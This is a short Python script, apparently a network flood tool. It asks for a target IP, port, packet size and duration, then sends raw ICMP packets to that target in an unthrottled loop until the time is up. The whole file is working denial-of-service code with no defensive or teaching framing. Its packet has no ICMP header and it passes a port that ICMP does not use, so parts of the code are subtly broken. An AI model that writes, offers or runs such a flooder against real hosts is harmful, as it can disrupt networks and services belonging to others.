import os
import sys
import socket
import struct
import time

def send_icmp_request(ip, port, packet_size, duration):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error as e:
        print(f"Socket creation failed: {str(e)}")
        sys.exit()

    start_time = time.time()
    end_time = start_time + duration
    count = 0

    packet_data = struct.pack('d', time.time()) + b'x' * (packet_size - 8)

    while True:
        if time.time() >= end_time:
            break

        try:
            sock.sendto(packet_data, (ip, port))
            count += 1
        except socket.error as e:
            print(f"Socket error occurred: {str(e)}")
            break

    sock.close()

    print(f"Sent {count} packets in {duration} seconds.")

if __name__ == "__main__":
    ip = input("Enter IP address: ")
    port = int(input("Enter port: "))
    packet_size = int(input("Enter packet size: "))
    duration = int(input("Enter time (in seconds): "))

    send_icmp_request(ip, port, packet_size, duration)
